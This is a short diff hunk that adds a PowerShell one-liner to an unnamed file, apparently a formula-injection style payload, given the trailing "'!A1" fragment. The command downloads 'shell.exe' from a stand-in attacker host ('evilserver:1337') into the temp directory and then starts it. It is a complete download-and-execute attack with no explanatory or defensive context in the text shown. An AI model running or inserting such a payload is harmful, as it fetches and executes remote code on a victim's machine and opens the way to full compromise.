@@ -1,0 +1,3 @@
+Invoke-WebRequest "http://evilserver:1337/shell.exe"
+-OutFile "$env:Temp\shell.exe";
+Start-Process "$env:Temp\shell.exe"'!A1
